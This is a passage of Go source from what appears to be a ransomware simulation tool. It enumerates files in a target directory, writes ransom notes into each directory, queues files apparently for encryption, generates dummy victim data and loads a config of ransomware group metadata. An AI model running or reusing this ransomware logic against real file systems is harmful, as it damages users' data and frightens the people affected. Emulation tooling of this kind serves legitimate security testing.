		fileList, _ = gatherFiles(fileList, recursive, targetDir)
	}
	if len(fileList) != 0 {
		// We have populated file-list - either from top-level or created files
		for _, v := range fileList {
			baseDir := filepath.Dir(v)
			if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
				createNote(note, noteName, baseDir)
				ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
			}
			i, err := os.Stat(v)
			if err != nil {
				continue
			}
			f := File{
				Path: v,
				Size: i.Size(),
			}
			c <- f
		}
	} else if recursive {
		filepath.Walk(targetDir,
			func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}
				baseDir := filepath.Dir(path)
				if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
					createNote(note, noteName, baseDir)
					ransomwareNoteDirs = append(ransomwareNoteDirs, baseDir)
				}
				f := File{
					Path: path,
					Size: info.Size(),
				}
				c <- f
				return nil
			})
	}
	close(c)
}

func createNote(note string, noteName string, destDir string) {
	f, _ := os.Create(filepath.Join(destDir, noteName))
	f.Write([]byte(note))
	f.Close()
}

func gatherFiles(fileList []string, recursive bool, targetDir string) ([]string, error) {
	if !recursive {
		files, _ := os.ReadDir(targetDir)
		for _, v := range files {
			if v.IsDir() {
				continue
			}
			fileList = append(fileList, filepath.Join(targetDir, v.Name()))
		}
	} else {
		filepath.Walk(targetDir,
			func(path string, info os.FileInfo, err error) error {
				fileList = append(fileList, path)
				fmt.Println(path, info.Size())
				return nil
			})
	}
	return fileList, nil
}

func replaceExtensionVariables(extension string) string {
	var runes = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
	for true {
		if strings.Contains(extension, "%R") {
			extension = strings.Replace(extension, "%R", string(runes[rand.Intn(len(runes))]), 1)
		} else {
			break
		}
	}
	return extension
}

// CreateFiles - Handles the creation of dummy data inside the target directory
func CreateFiles(fileCount int, fileSize int, targetdir string) (error, []string) {
	printFormattedMessage(fmt.Sprintf("Creating Dummy Data inside directory: %s", targetdir), INFO)
	printFormattedMessage(fmt.Sprintf("Target Size: %d Megabytes", fileSize), INFO)
	printFormattedMessage(fmt.Sprintf("Target File Count: %d", fileCount), INFO)
	fileList := make([]string, 0)
	// Makes a random number of subdirectories followed by numbers and dates and distributes chunks of files into them
	validDirs := make([]string, 0)
	subdir_count := rand.Intn(20) + 3
	for i := 0; i < subdir_count; i++ {
		tmp := filepath.Join(targetdir, fmt.Sprintf("%s_%d_%d_%d", subdir_names[rand.Intn(len(subdir_names))], time.Now().Year(), rand.Intn(12), rand.Intn(60)))
		err := makeDirectory(tmp)
		if err != nil {
			printFormattedMessage(fmt.Sprintf("Error Creating Directory: %s", err.Error()), ERROR)
			continue
		}
		validDirs = append(validDirs, tmp)
	}
	// Now we have a set of directories to load files into
	// We will distribute the files as evenly as possible between the directories
	targetFileSizeMegabytes := float64(fileSize) / float64(fileCount)
	targetFileSizeBytes := int(targetFileSizeMegabytes * (1 << 20))
	filesPerDirectory := fileCount / len(validDirs)
	var wg sync.WaitGroup
	for _, v := range validDirs {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for i := 0; i < filesPerDirectory; i++ {
				tmpFileName := fmt.Sprintf("%s_%s_%d_%d_%d.%s", file_names[rand.Intn(len(file_names))], subFileNames[rand.Intn(len(subFileNames))], rand.Intn(30), time.Now().Year(), rand.Intn(60), dummy_extensions[rand.Intn(len(dummy_extensions))])
				tmpFileFull := filepath.Join(v, tmpFileName)
				f, err := os.Create(tmpFileFull)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Error Creating File: %s", err.Error()), ERROR)
					continue
				}
				io.Copy(f, io.LimitReader(r.Reader, int64(targetFileSizeBytes)))
				fileList = append(fileList, tmpFileFull)
				f.Close()
			}
		}()
	}
	wg.Wait()
	return nil, fileList
}

func makeDirectory(dir string) error {
	err := os.Mkdir(dir, os.ModeDir)
	if err != nil && !os.IsExist(err) {
		return err
	}
	return nil
}

// ReadConfig - Handles reading the embedded configuration file containing ransomware group metadata
func ReadConfig() (Config, error) {
	var tmp Config
	var data []byte
	var readerr error
	data, readerr = configFile.ReadFile("config.yaml")
	if readerr != nil {
		return tmp, readerr
	}
	err := yaml.Unmarshal(data, &tmp)
	if err != nil {
		return tmp, fmt.Errorf("YAML Unmarshal Error: %w", err)
	}
	return tmp, err
}

func doesOSEntryExist(dir string) error {
	if _, err := os.Stat(dir); err != nil {
		return err
	}
	return nil

}
